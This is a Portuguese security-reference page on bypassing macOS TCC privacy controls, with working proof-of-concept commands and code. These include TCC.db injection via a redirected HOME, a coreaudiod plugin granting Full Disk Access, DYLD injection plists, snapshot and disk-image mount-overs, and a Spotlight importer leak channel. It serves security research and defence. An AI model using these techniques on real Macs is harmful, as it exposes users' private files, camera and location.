# Bypasses do TCC do macOS

{{#include ../../../../../banners/hacktricks-training.md}}

Para armazenamento de concessões do TCC e atribuição de remetente/alvo do Automation, consulte a [visão geral do TCC do macOS](../index.html#identify-apple-events-sender-and-target-grants).

## Por funcionalidade

### Write Bypass

Isto não é um bypass, é simplesmente assim que o TCC funciona: **Ele não protege contra gravação**. Se o Terminal **não tiver acesso de leitura à Mesa de um usuário, ainda poderá gravar nela**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

O **atributo estendido `com.apple.macl`** é adicionado ao novo **arquivo** para dar ao **aplicativo criador** acesso de leitura.<sup>[[2]](#references)</sup>

### TCC ClickJacking

É possível **colocar uma janela sobre o prompt do TCC** para fazer o usuário **aceitá-lo** sem perceber. Você pode encontrar um PoC em [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Solicitação TCC com nome arbitrário

Um atacante pode **criar aplicativos com qualquer nome** (por exemplo, Finder, Google Chrome...) no **`Info.plist`** e fazê-los solicitar acesso a algum local protegido pelo TCC. O usuário pensará que o aplicativo legítimo está solicitando esse acesso.\
Além disso, é possível **remover o aplicativo legítimo do Dock e colocar o falso no lugar**, para que, quando o usuário clicar no falso (que pode usar o mesmo ícone), ele possa chamar o aplicativo legítimo, solicitar permissões do TCC e executar um malware, fazendo o usuário acreditar que o aplicativo legítimo solicitou o acesso.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Mais informações e PoC em:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Por padrão, um acesso via **SSH costumava ter "Full Disk Access"**. Para desativar isso, é preciso que ele esteja listado, mas desativado (removê-lo da lista não remove esses privilégios):<sup>[[2]](#references)</sup>

![Solicitação TCC com nome arbitrário - SSH Bypass: Por padrão, um acesso via SSH costumava ter "Full Disk Access". Para desativar isso, é preciso que ele esteja listado, mas desativado (removê-lo...](<../../../../../images/image (1077).png>)

Aqui você encontra exemplos de como alguns **malwares conseguiram contornar essa proteção**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Observe que, agora, para habilitar o SSH, é necessário ter **Full Disk Access**

### Manipulação de extensões - CVE-2022-26767

O atributo **`com.apple.macl`** é atribuído a arquivos para conceder a **um determinado aplicativo permissão para lê-los.** Esse atributo é definido quando um arquivo é arrastado e solto sobre um aplicativo, ou quando o usuário **clica duas vezes** em um arquivo para abri-lo com o **aplicativo padrão**.

Assim, um usuário poderia **registrar um aplicativo malicioso** para lidar com todas as extensões e chamar o Launch Services para **abrir** qualquer arquivo (dessa forma, o aplicativo malicioso receberá permissão para lê-lo).<sup>[[23]](#references)</sup>

### iCloud

Com o entitlement **`com.apple.private.icloud-account-access`**, é possível se comunicar com o serviço XPC **`com.apple.iCloudHelper`**, que **fornecerá tokens do iCloud**.

**iMovie** e **Garageband** tinham esse entitlement e outros que permitiam isso.

Para mais **informações** sobre o exploit para **obter tokens do iCloud** usando esse entitlement, confira a palestra: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Vazamento do Spotlight importer via nomes de notificações Darwin

Um Spotlight importer pode ler o arquivo que o Spotlight passa para seu callback `GetMetadataForFile`, mesmo quando um processo normal sem Full Disk Access não consegue lê-lo. Ao contrário da [injeção de código em um processo autorizado pelo TCC](../macos-tcc-credential-and-data-theft.md), isso exige um acesso local que permita instalar um importer e que ocorra um evento correspondente de indexação do Spotlight. O importer está em sandbox, mas notificações Darwin que contêm apenas o nome podem transportar bytes para um listener fora desse sandbox. Este é um canal de data-leak, não uma forma de obter root ou acesso arbitrário a arquivos a partir do importer.<sup>[[24]](#references)</sup>

Declare o tipo de arquivo alvo em `CFBundleDocumentTypes` → `LSItemContentTypes` no `Info.plist` do importer e, em seguida, instale o bundle em `~/Library/Spotlight/` ou em `Contents/Library/Spotlight/` de um aplicativo. Verifique o registro com `mdimport -L`. A [seção sobre Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) aborda o local de instalação do bundle e a correspondência de tipos de arquivo. O importer só recebe arquivos para os quais o Spotlight o seleciona; um importer existente geralmente tem prioridade. No macOS 26 Tahoe, `mdimport -i` não forçou de maneira confiável a indexação recursiva imediata nos testes relatados, enquanto `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` solicitou a reimportação das UTIs reivindicadas por esse importer.<sup>[[24]](#references)</sup>

Para testar o canal, inicie um listener fora do sandbox com `notifyutil -w TEST_TEST_TEST` e, em seguida, publique uma notificação com `CFNotificationCenterGetDarwinNotifyCenter()` e `NULL` como objeto e `userInfo`. Ao contrário de uma notificação distribuída com um payload `userInfo`, a notificação Darwin tem apenas seu nome. Para dados binários, registre o listener externo para os nomes decimais de `0` a `255` usando `notify_register_dispatch`; associe o registro de cada callback ao valor do byte correspondente. Dentro de `GetMetadataForFile`, leia apenas o `pathToFile` fornecido pelo Spotlight e envie cada byte como um nome de notificação decimal:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

O listener reconstrói a sequência de bytes em vez de ler o próprio arquivo protegido pelo TCC. O PoC publicado recuperou os primeiros 64 bytes de `knowledgeC.db` em um terminal sem FDA, com o SIP ativado no macOS 26. Esse método tem baixa largura de banda e não é confiável para cópias em massa: o Spotlight pode não indexar ou reindexar um arquivo-alvo, e instâncias simultâneas do importer podem intercalar fluxos de notificações. Consulte [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) para conhecer outros mecanismos de contorno dos limites do sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automação

Um app com a permissão **`kTCCServiceAppleEvents`** poderá **controlar outros Apps**. Isso significa que ele poderá **abusar das permissões concedidas aos outros Apps**.<sup>[[2]](#references)</sup>

Para mais informações sobre Apple Scripts, consulte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por exemplo, se um App tiver **permissão de Automação sobre o `iTerm`**, como neste exemplo, em que o **`Terminal`** tem acesso ao iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Sobre o iTerm

O Terminal, que não tem FDA, pode chamar o iTerm, que tem, e usá-lo para executar ações:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Pelo Finder

Ou, se um aplicativo tiver acesso pelo Finder, ele poderia executar um script como este:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Por comportamento do App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

O **daemon tccd** em userland usava a variável **env** **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acordo com [esta publicação no Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e como o daemon TCC é executado por meio do **`launchd`** no domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas a ele.<sup>[[19]](#references)</sup>\
Assim, um **atacante poderia definir a variável de ambiente `$HOME`** no **`launchctl`** para apontar para um **diretório** **controlado**, **reiniciar** o daemon **TCC** e, então, **modificar diretamente o banco de dados do TCC** para conceder a si mesmo **todos os direitos TCC disponíveis**, sem nunca solicitar autorização ao usuário final.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

O Notes tinha acesso a locais protegidos pelo TCC, mas uma nota recém-criada era **armazenada em um local não protegido**. Portanto, um atacante podia pedir ao Notes para copiar um arquivo protegido para uma nota e, em seguida, acessar os dados resultantes no local não protegido:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

O binário `/usr/libexec/lsd`, com a biblioteca `libsecurity_translocate`, tinha o entitlement `com.apple.private.nullfs_allow`, que permitia criar montagens **nullfs**, e o entitlement `com.apple.private.tcc.allow` com **`kTCCServiceSystemPolicyAllFiles`** para acessar todos os arquivos.

Era possível adicionar o atributo quarantine a "Library", chamar o serviço XPC **`com.apple.security.translocation`** e, então, ele mapearia Library para **`$TMPDIR/AppTranslocation/d/d/Library`**, onde todos os documentos dentro de Library poderiam ser **acessados**.

### CVE-2024-44131 - FileProvider symlink race

Apps que delegam operações de arquivo a um **helper privilegiado** (neste caso, **`fileproviderd`** / `Files.app`) copiam ou movem itens **em nome do usuário**, então a cópia é executada com os privilégios do helper, e não com os do processo chamador.

O Jamf Threat Labs demonstrou que a validação de symlink realizada antes da operação pode sofrer uma **race**: em vez de criar o symlink no **último** componente do caminho (que é verificado), o atacante substitui um diretório **intermediário** do caminho **depois que a cópia já começou**. O helper privilegiado segue então o link controlado pelo atacante e lê/grava em locais protegidos pelo TCC **sem nunca exibir um prompt**.<sup>[[5]](#references)</sup>

Diretórios que **não** são protegidos por um UUID aleatório no caminho (por exemplo, `~/Library/Mobile Documents/com~apple~CloudDocs`) são os alvos mais fáceis, porque o atacante pode prever o caminho completo para executar a race.

> [!TIP]
> Este é o padrão genérico a procurar: **qualquer processo privilegiado que resolva um caminho mais de uma vez** (check-then-use ou `rename()`/`copyfile()` resolvendo a origem e o destino separadamente) pode sofrer uma race se um diretório no meio do caminho for substituído. Apenas `O_NOFOLLOW_ANY`, `openat()` em um FD de diretório já aberto ou `realpath()` + revalidação realmente fecham essa brecha.

Mais informações em [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` pode ser compilada com `SQLITE_ENABLE_SQLLOG`, que adiciona um hook de logging controlado por variáveis de ambiente ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – para **cada banco de dados aberto**, uma **cópia do arquivo do banco de dados** e um log das instruções SQL são gravados em `path` (o diretório já deve existir).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – cria uma **nova cópia a cada vez** que um DB é aberto/anexado, em vez de reutilizar uma.
- **`SQLITE_SQLLOG_CONDITIONAL`** – registra uma conexão apenas se existir um arquivo `<database>-sqllog` ao lado do DB principal.

Se você puder injetar essa variável em um processo que tenha **FDA** e abra bancos de dados SQLite, ele **copiará** esses bancos protegidos para um diretório sob seu controle. Como o nome do arquivo de destino é derivado de dados controlados pelo atacante, um **symlink criado no destino** transforma a mesma primitiva em uma **gravação arbitrária de arquivo** com os privilégios do processo-alvo.

### **SQLITE_AUTO_TRACE**

Se a variável de ambiente **`SQLITE_AUTO_TRACE`** estiver definida, a biblioteca **`libsqlite3.dylib`** começará a **registrar** todas as consultas SQL. Muitos aplicativos usavam essa biblioteca, então era possível registrar todas as consultas SQLite deles.<sup>[[22]](#references)</sup>

Vários aplicativos da Apple usavam essa biblioteca para acessar informações protegidas pelo TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Buscando gravações de arquivos controladas por variáveis de ambiente

As duas entradas anteriores são exemplos da mesma técnica genérica, e vale a pena procurar outros casos: **frameworks carregados por apps com privilégios do TCC frequentemente expõem variáveis de ambiente de debug/log que fazem o processo criar um arquivo em um caminho controlado pelo chamador**.

Fluxo para encontrá-las:

1. Escolha um alvo com FDA ou outra permissão interessante do TCC (`Music`, `TV`, `Terminal`, agentes de MDM...) e liste os frameworks aos quais ele se vincula (`otool -L`, `vmmap`).
2. Procure strings de `getenv` nesses frameworks: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Defina as variáveis candidatas com `launchctl setenv NAME /path/you/control`, inicie o app e observe o que ele faz no sistema de arquivos com `fs_usage -w -f filesys <pid>` ou `sudo fs_usage | grep <path>`.
4. Se o processo **criar ou renomear** um arquivo no seu diretório, você tem uma primitiva de escrita: aponte o destino para um symlink (ou faça uma corrida em um diretório intermediário, como no CVE-2024-44131 acima) para redirecionar a gravação para `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Duas coisas limitam essa técnica. Primeiro, **variáveis `DYLD_*` são ignoradas em binários com hardened runtime**, a menos que o app tenha o entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("um valor booleano que indica se o app pode ser afetado por variáveis de ambiente do dynamic linker, que você pode usar para injetar código no processo do app") — veja também [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Segundo, a Apple remove variáveis de debug de frameworks quando elas são reportadas, então uma variável que funcionava em uma versão do macOS muitas vezes já não existe na seguinte. Se um app se recusar silenciosamente a iniciar depois que você definir uma variável, considere que ela já foi filtrada.<sup>[[7]](#references)[[8]](#references)</sup>

Veja [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) para o truque equivalente com variáveis do linker.

### Apple Remote Desktop

Como root, você poderia habilitar esse serviço, e o **agente ARD terá acesso total ao disco**, podendo ser abusado por um usuário para fazê-lo copiar um novo **banco de dados de usuário do TCC**.

## Por **NFSHomeDirectory**

O TCC usa um banco de dados na pasta HOME do usuário para controlar o acesso a recursos específicos desse usuário em **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Portanto, se o usuário conseguir reiniciar o TCC com uma variável de ambiente $HOME apontando para uma **pasta diferente**, poderá criar um novo banco de dados do TCC em **/Library/Application Support/com.apple.TCC/TCC.db** e enganar o TCC para conceder qualquer permissão do TCC a qualquer app.

> [!TIP]
> A Apple usa a configuração armazenada no perfil do usuário, no atributo **`NFSHomeDirectory`**, como **valor de `$HOME`**. Portanto, se você comprometer um app com permissão para modificar esse valor (**`kTCCServiceSystemPolicySysAdminFiles`**), poderá **weaponize** essa opção para contornar o TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

A **primeira POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar a pasta **HOME** do usuário.

1. Obtenha um blob _csreq_ para o app alvo.
2. Coloque um arquivo _TCC.db_ falso com o acesso necessário e o blob _csreq_.
3. Exporte a entrada do usuário no Directory Services com [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifique a entrada do Directory Services para alterar o diretório home do usuário.
5. Importe a entrada modificada do Directory Services com [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Pare o _tccd_ do usuário e reinicie o processo.

A segunda POC usava **`/usr/libexec/configd`**, que tinha `com.apple.private.tcc.allow` com o valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era possível executar **`configd`** com a opção **`-t`**, que permitia ao atacante especificar um **Bundle personalizado para carregar**. Portanto, o exploit **substitui** o método de alteração do diretório home do usuário usando **`dsexport`** e **`dsimport`** por uma **injeção de código em `configd`**.

Para mais informações, consulte o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Por injeção de processo

Existem diferentes técnicas para injetar código em um processo e abusar dos privilégios dele no TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Além disso, a técnica de injeção de processo mais comum encontrada para contornar o TCC é por meio de **plugins (load library)**.\
Plugins são código adicional, geralmente na forma de bibliotecas ou plist, que serão **carregados pelo app principal** e executados no contexto dele. Portanto, se o app principal tiver acesso a arquivos restritos pelo TCC (por permissões concedidas ou entitlements), o **código personalizado também terá**.

### CVE-2020-27937 - Directory Utility

O app `/System/Library/CoreServices/Applications/Directory Utility.app` tinha o entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, carregava plugins com a extensão **`.daplug`** e **não tinha o hardened runtime**.

Para weaponize esse CVE, o **`NFSHomeDirectory`** é **alterado** (abusando do entitlement anterior) para **assumir o controle do banco de dados do TCC do usuário** e contornar o TCC.

Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

O binário **`/usr/sbin/coreaudiod`** tinha os entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. O primeiro **permitia a injeção de código** e o segundo dava acesso para **gerenciar o TCC**.

Esse binário permitia carregar **plugins de terceiros** da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível **carregar um plugin e abusar das permissões do TCC** com esta POC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Plug-ins da Camada de Abstração de Dispositivos (DAL)

Aplicativos do sistema que abrem um fluxo da câmera via Core Media I/O (aplicativos com **`kTCCServiceCamera`**) carregam esses plug-ins no processo, a partir de `/Library/CoreMediaIO/Plug-Ins/DAL` (não é restrito pelo SIP).

Basta armazenar nesse local uma biblioteca com um **constructor** comum para **injetar código**.

Vários aplicativos da Apple eram vulneráveis a isso.

### Firefox

O aplicativo Firefox tinha os entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Para mais informações sobre como explorar isso facilmente, [**consulte o relatório original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

O binário `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tinha os entitlements **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, que permitiam injetar código no processo e usar os privilégios do TCC.

### CVE-2023-26818 - Telegram

O Telegram tinha os entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, então era possível abusar deles para **obter acesso às permissões do aplicativo**, como gravar usando a câmera. Você pode [**encontrar o payload no writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Observe que, para usar a variável de ambiente a fim de carregar uma library, foi criado um **plist personalizado** para injetar essa library, e o **`launchctl`** foi usado para iniciá-la:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Por meio de invocações de open

É possível invocar **`open`** mesmo em sandbox

### Scripts do Terminal

É bastante comum conceder **Acesso Total ao Disco (FDA)** ao Terminal, pelo menos em computadores usados por pessoas da área de tecnologia. Também é possível invocar scripts **`.terminal`** com esse acesso.

Os scripts **`.terminal`** são arquivos plist como este, com o comando a executar na chave **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Um aplicativo poderia gravar um script de terminal em um local como /tmp e iniciá-lo com um comando como:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Por montagem

### CVE-2020-9771 - bypass de TCC do mount_apfs e escalonamento de privilégios

**Qualquer usuário** (até mesmo sem privilégios) pode criar e montar um snapshot do Time Machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é que o aplicativo usado (como `Terminal`) tenha acesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que precisa ser concedido por um administrador.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Uma explicação mais detalhada pode ser [**encontrada no relatório original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Montagem sobre arquivo TCC

Mesmo que o arquivo do banco de dados TCC estivesse protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Confira o **exploit completo** no [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Como explicado no [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), esse CVE explorava o `diskarbitrationd`.<sup>[[16]](#references)</sup>

A função `DADiskMountWithArgumentsCommon` do framework público `DiskArbitration` realizava as verificações de segurança. No entanto, era possível contorná-las chamando diretamente o `diskarbitrationd` e, assim, usar elementos `../` no caminho e symlinks.

Isso permitia que um atacante fizesse montagens arbitrárias em qualquer local, inclusive sobre o banco de dados TCC, devido ao entitlement `com.apple.private.security.storage-exempt.heritable` do `diskarbitrationd`.

### asr

A ferramenta **`/usr/sbin/asr`** permitia copiar o disco inteiro e montá-lo em outro local, contornando as proteções do TCC.

### CVE-2022-22655 - Serviços de Localização

Os Serviços de Localização **não** são armazenados em um banco de dados TCC como os outros serviços. Eles são gerenciados pelo `locationd`, que mantém sua própria lista de permissões em **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Cada entrada é indexada pelo cliente (bundle ID ou caminho do executável) e contém campos como `Authorized`, `BundleId`, `Executable` e `Registered`.<sup>[[4]](#references)</sup>

O próprio arquivo `clients.plist` é protegido pelo Sandbox/TCC e não pode ser editado nem mesmo como root — mas o diretório **`/var/db/locationd/` não era protegido contra montagem**. Assim, um invasor executando como root poderia criar uma imagem de disco contendo seu próprio `clients.plist` (com seu binário marcado como `Authorized`), montá-la sobre o diretório e reiniciar o `locationd` para que a lista de permissões forjada entrasse em vigor.<sup>[[3]](#references)</sup>

> [!TIP]
> Este é o mesmo padrão dos bypasses de TCC com `hdiutil`/`mount` acima: o *arquivo* é protegido, mas o *diretório onde ele fica* não é; então, você substitui o diretório inteiro em vez do arquivo.

## Por aplicativos de inicialização


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Por grep

Em várias ocasiões, arquivos armazenam informações confidenciais, como e-mails, números de telefone, mensagens... em locais não protegidos (o que a Apple considera uma vulnerabilidade).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Isso não funciona mais, mas [**funcionava no passado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Outra maneira, usando [**eventos do CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

